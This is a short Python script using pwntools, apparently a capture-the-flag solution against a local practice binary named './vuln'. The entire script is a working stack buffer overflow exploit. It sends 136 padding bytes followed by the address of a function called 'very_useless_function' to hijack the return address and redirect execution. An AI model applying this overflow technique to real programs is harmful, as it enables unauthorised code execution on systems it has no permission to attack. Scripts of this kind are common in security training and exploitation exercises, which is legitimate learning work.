 
from pwn import *
context.binary = './vuln'
elf = context.binary
address = p64(elf.symbols['very_useless_function'])
p=process(context.binary.path)
p.sendline("y")
p.sendlineafter("it:", b'a'*136 + address)
print(p.recvall())
